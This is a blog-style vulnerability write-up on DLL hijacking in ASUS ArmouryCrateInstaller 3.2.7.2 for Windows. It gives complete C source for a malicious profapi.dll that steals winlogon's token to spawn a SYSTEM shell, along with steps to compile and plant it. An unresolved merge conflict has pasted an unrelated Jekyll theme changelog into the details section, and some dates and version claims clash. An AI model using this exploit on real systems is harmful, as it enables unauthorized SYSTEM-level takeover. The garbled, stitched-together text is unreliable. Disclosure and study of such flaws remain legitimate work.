---
title: Local Privilege Escalation in Aura Sync / Aura Creator - ArmouryCrate Windows Installer
author: RashidKhanPathan
date: 2019-08-08 14:10:00 +0800
categories: [Windows]
tags: [writing]
render_with_liquid: false
---

## 0x01: Details

<<<<<<< HEAD:CHANGELOG.md
- Title: Local Privilege Escalation in Aura Sync / Aura Creator - ArmouryCrateInstaller 3.2.7.2 For Windows Installer
- CVE ID: None
- Vendor ID : None
- Advisory Published: 5 Aug 2023
- Advisory URL : [https://www.asus.com](AddHere)
=======
## [6.4.2](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/compare/v6.4.1...v6.4.2) (2024-01-13)

### Bug Fixes

* resume the `blockquote` display type ([#1480](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1480)) ([c7cfde0](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/c7cfde093020c73ca9a1b83437eb600379e05918)), closes [#1449](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1449)

## [6.4.1](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/compare/v6.4.0...v6.4.1) (2024-01-10)

### Bug Fixes

* `og:image` URL is incorrect ([#1468](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1468)) ([b2d1cb6](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/b2d1cb68db659270aac537d2aa8d4b806fa6991d)), closes [#1463](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1463)

## [6.4.0](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/compare/v6.3.1...v6.4.0) (2024-01-10)

### Features

* add bilibili embed video support ([#1406](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1406)) ([4a2b89d](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/4a2b89d0b698d672486349131a89025fa47afcb6))
* add site-wide social preview image settings ([#1463](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1463)) ([241bb4d](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/241bb4df7878cff7f82014df660874a1dcddba76))

### Bug Fixes

*  image float breaks quotes and prompts ([#1449](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1449)) ([ea2d238](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/ea2d238bd8adc018256862e05a5092311c87a671)), closes [#1441](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1441)
* url-less authors should not have empty links ([#1410](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1410)) ([2a4fbf6](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/2a4fbf6a7925da610a75c498116da7cf9ba857d7)), closes [#1403](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1403)

### Improvements

* include the latest posts in the "Recently Updated" list ([#1456](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1456)) ([82d8f2d](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/82d8f2db984711f334f55b6af5098ec16770e824))

## [6.3.1](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/compare/v6.3.0...v6.3.1) (2023-11-12)

### Bug Fixes

* **home:** responsive gap at the bottom of preview image ([1a977a8](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/1a977a87a0da1cff35d0896cf9265c31034841a6))

## [6.3.0](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/compare/v6.2.3...v6.3.0) (2023-11-10)

### Features

* add Mastodon sharing link ([#1344](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1344)) ([2bf87e0](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/2bf87e0de7928f325811e1bb96cfcaefdf6cf66a)), closes [#1324](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1324)

### Bug Fixes

* **home:** crop the preview image that doesn't match 1.91:1 ([#1325](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1325)) ([5810bcd](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/5810bcd1d7b83e111017831fa82c368a6b15c7cd))
* resume lazy loading for Twitch videos ([#1326](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1326)) ([9f174d9](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/9f174d9088e5c83a5e0c4630336cea65e199c553)), closes [#1267](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1267)

## [6.2.3](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/compare/v6.2.2...v6.2.3) (2023-10-10)

### Bug Fixes

* avoid `utterances` initialization failure  ([#1234](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1234)) ([b34661e](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/b34661efd72e8697fd5b30ba7e55c86c7dd10338))
* **home:** avoid LQIP dirty data passing to the next post ([#1278](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1278)) ([109725d](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/109725d2dc56e329c60a876e9ce4094513fd36a5))
* **posts:** code snippet clipboard tooltip missing title ([#1246](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1246)) ([726085c](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/726085c6478e7a9dc2cc57189b2dcbc85d90f048))
* **posts:** resume target highlighting for superscripts and footnotes ([#1253](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1253)) ([0465a98](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/0465a985dc5262fa2043540f4eddafa251f917a3))

### Improvements

* **comments:** lazy load `giscus` ([#1254](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1254)) ([e9c9206](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/e9c920641b9c97594fa078ea89747d77eb7e7493))
* **core:** replace `lazysizes` with browser-level lazy loading ([#1267](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1267)) ([bf3a34d](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/bf3a34d0544b49fcf40f57080c4d6b4ff44750c4))
* **layout:** improve margins for tail block ([#1243](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1243)) ([13a3c3c](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/13a3c3c906bb6c5a38314ea27b6cf3767df94b27))
* **layout:** optimize the main block height calculation ([#1249](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1249)) ([73e171b](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/73e171b0fbce4a542e2141d7e2b1144450571ce1))
* **pwa:** enhance cache privacy protection ([#1275](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1275)) ([2d56597](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/2d56597571aaafa92251d192861ea69cce3e83d2))
* **ui:** standardize metadata text styles ([#1295](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1295)) ([2574118](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/2574118f40a956184705f87dea4d88e7c246a055))
* **ux:** render background color before loading preview image ([#1298](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1298)) ([42bf39e](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/42bf39e21c9a497aecc3e9b4549e2fc3ba4a1e4a))

## [6.2.2](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/compare/v6.2.1...v6.2.2) (2023-09-10)

### Bug Fixes

* **sidebar:** contact icons not stacking ([#1224](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1224)) ([273b389](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/273b389c512f13693ed6cdf57d256ac21deae97c))

## [6.2.1](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/compare/v6.2.0...v6.2.1) (2023-09-10)

### Bug Fixes

* **pwa:** installation failure caused by outdated cache entries ([4da7406](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/4da7406dfea112a4a2b1db5615ecf2672be6694f))

## [6.2.0](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/compare/v6.1.0...v6.2.0) (2023-09-10)

### Features

* **layout:** center the footer ([41b8f9f](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/41b8f9f519e5f5f69e9a123b38b06bade2271a82))
* **posts:** render heading 4 in TOC ([#1023](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1023)) ([229c2a2](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/229c2a2e2b109fc2eca85be548f1dd97234e44c4))
* **ui:** redesign the pagination button on home page ([62bcd60](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/62bcd601fcadc602c81672b1d4b937231396c3c0))
* **ui:** update the twitter icon ([#1221](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1221)) ([aff7566](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/aff75667749769644f990d3dc9b0720c7d96d14d))

### Improvements

* **core:** speed up the Jekyll build times ([#1163](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1163)) ([0d4103d](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/0d4103d47bc9cff93918bb09a2957737cc3c9fe0))
* refactor using semantic HTML ([#1207](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1207)) ([505e314](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/505e314a3142c332e39365fbe2dac23df1bf0abe)), closes [#1196](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/1196)
* **ui:** improve code snippet design ([4f86b04](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/4f86b04a8487ebbf4a6d0d70b0c3ece79e9269f3))
* **ui:** improve web accessibility ([#447](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/issues/447)) ([37c9764](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/commit/37c976499ead51c1d88e8e8213366240a72adebc))

## [6.1.0](https://github.com/RashidKhanPathan/jekyll-theme-chirpy/compare/v6.0.0...v6.1.0) (2023-07-02)
>>>>>>> 717659d66ef1f68505417fbc8498b88bdbbb1f09:docs/CHANGELOG.md

## 0x02: Test Environment

ArmouryCrateInstaller Version: 3.2.7.2 

OS : Windows 10 20H2 (OS Build: 19045.3508)

## 0x03: Vulnerability details

Vulnerability that allows a local attacker to gain SYSTEM privileges by exploiting administrator privileges, and that enables the server thread to perform actions on behalf of the client, but within the limits of the client's security context.

## 0x04: Technical description

Many DLLs are loaded from the directory where the ArmouryCrateInstaller is located. Among these Dlls, `TextShaping.dll` is loaded, and this DLL load is done with Administrator privileges. So, by placing `profapi.dll, PROPSYS.dll, edputil.dll, urlmon.dll, SspiCli.dll` in the directory where the ArmouryCrateInstaller Version, you can gain SYSTEM privileges by abusing Administrator privileges.

Over the horizon comes

## 0x05: Complete Exploit

```c
/*
 - ZeroDay Research  -
@component: Asus Aura Sync / Aura Creator - ArmouryCrateInstaller 3.2.7.2

@filename: dllpoc.cpp

@vulnerability: 0Day - Arbitrary Code Execution (DLL Hijacking) To Local Privilege Escalation In Asus Aura Sync - ArmouryCrateInstaller 3.2.7.2

@author: RashidKhan Pathan (iHexCoder)


*/

#include <stdio.h>
#include <windows.h>
#include <Psapi.h>
#include <Tlhelp32.h>
#include <sddl.h>
#include <iostream>


#pragma comment (lib,"advapi32.lib")

void exploit() {
    printf("[+] Vulnerability: Local Privilege Escalation Via DLL Hijacking \n");
    printf("[+] Author: RashidKhan Pathan (iHexCoder) \n");
    printf("[+] Tested On: Windows 10 20H2 (OS Build: 19045.3508) \n");
    printf("[+] Affected Products: Aura Sync / Aura Creator - ArmouryCrateInstaller 3.2.7.2 \n");
    printf("[+] Affected Components: profapi.dll, PROPSYS.dll, edputil.dll, urlmon.dll, SspiCli.dll \n");

    DWORD lpidProcess[2048], lpcbNeeded, cProcesses;
    EnumProcesses(lpidProcess, sizeof(lpidProcess), &lpcbNeeded);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PROCESSENTRY32 p32;
    p32.dwSize = sizeof(PROCESSENTRY32);

    int processwinloginPid;

    if (Process32First(hSnapshot, &p32)) {
        do {
            if (wcscmp(p32.szExeFile, L"winlogon.exe") == 0) {
                printf("[+] Located winlogon.exe by process name (PID %d)\n", p32.th32ParentProcessID);
                processwinloginPid = p32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &p32));

        CloseHandle(hSnapshot);

        LUID luid;
        HANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());

        if (currentProc) {
            HANDLE TokenHandle = NULL;
            BOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle);
            if (hProcessToken) {
                BOOL checkToken = LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid);

                if (!checkToken) {
                    printf("[+] Current Process token Already Include SeDebugPrivilege \n");
                }
                else
                {
                    TOKEN_PRIVILEGES tokenPrivs;

                    tokenPrivs.PrivilegeCount = 1;
                    tokenPrivs.Privileges[0].Luid = luid;
                    tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                    BOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
                    
                    if (adjustToken != 0)
                    {
                        printf("[+] Added SeDebugPrivilege to the current process token: %lx \n", adjustToken);
                    }
                }
                CloseHandle(TokenHandle);
            }
        }
        CloseHandle(currentProc);

        HANDLE hProcess = NULL;
        HANDLE TokenHandle = NULL;
        HANDLE NewToken = NULL;
        BOOL OpenToken;
        BOOL Impersonate;
        BOOL Duplicate;

        hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processwinloginPid);

        if (!hProcess)
        {
            printf("[-] Faild To Obtain a Handle To The Target PID \n");
        }
        printf("[+] Obtained Handle To The Target PID %lx\n", hProcess);

        OpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);

        if (!OpenToken)
        {
            printf("[-] Faild To Obtain Handle to The TOKEN %d\n", GetLastError());
        }
        printf("[+] Obtained A Handle To The Target Token %lx \n", OpenToken);

        Impersonate = ImpersonateLoggedOnUser(TokenHandle);
        if (!Impersonate)
        {
            printf("[-] Faild To Impersonate The TOKEN User \n");
        }
        printf("[+] Impersonted The Token's User %lx \n", Impersonate);

        Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &NewToken);
        if (!Duplicate)
        {
            
            printf("[-] Faild To Dulplicate The Target Token\n");
        }
        printf("[+] Duplicated The Target Token %lx \n", Duplicate);

        BOOL NewProcess;
        STARTUPINFO lpStartupInfo = { 0 };
        PROCESS_INFORMATION lpProcessInformation = { 0 };

        lpStartupInfo.cb = sizeof(lpStartupInfo);

        NewProcess = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &lpStartupInfo, &lpProcessInformation);

        if (!NewProcess)
        {
            printf("[-] Faild To Create A SYSTEM Process \n");
        }
        printf("[+] Create A SYSTEM Process %lx \n", NewProcess);
        printf("[+] Getting System Shell \n");
        printf("-------------------------------------------------------\n");

        CloseHandle(NewToken);
        CloseHandle(hProcess);
        CloseHandle(TokenHandle);
    }
}

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        exploit();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

1. Use Visual Studio 2019.
2. Compile the project in the DLL directory in x64 Release mode.
3. Rename the compiled dll to `profapi.dll` and place it in the same directory as ArmouryCrateInstaller.exe.
4. Run `ArmouryCrateInstaller`
5. We Will Get A System Shell With `NT Authority`

## 0x06: Affected Products

This vulnerability affects the following product:

- Asus Aura Sync/Creator - ArmouryCrateInstaller Version < 3.2.7.2

## 0x07: Credit information

RashidKhan Pathan (@itRashid)

## 0x08: TimeLine
- 4  Aug 2023 : Vulnerability Found
- 27 Aug 2023 : First time contacted via (security@asus.com) about ticket is not creating issue and vulnerability is critical
- 29 Aug 2023 : recevied a system generated mail from them, they told me to try again using ASUS Security Advisory Page
- 30 Aug 2023 :

## 0x09: Reference

- [https://www.asus.com](https://www.asus.com)
